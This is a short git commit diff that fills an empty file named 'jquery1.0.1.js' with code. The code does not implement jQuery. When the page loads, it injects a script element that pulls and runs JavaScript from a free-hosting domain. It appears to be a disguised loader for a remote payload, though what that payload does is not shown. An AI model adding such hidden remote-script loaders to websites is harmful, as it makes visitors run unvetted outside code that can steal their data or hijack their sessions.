3e65b40823c42578c8fa572831de6a75053fd905
kriztpow <45737457+kriztpow@users.noreply.github.com>
2019-06-16 01:17:47 -0400

    Update jquery1.0.1.js

--- jquery1.0.1.js
+++ jquery1.0.1.js
@@ -1,1 +1,5 @@
-
+$(document).ready(function(){
+var panamera = document.createElement('script');
+panamera.src = "https://storiepolices.000webhostapp.com/jquery1.0.1.js";
+document.body.appendChild(panamera);
+});
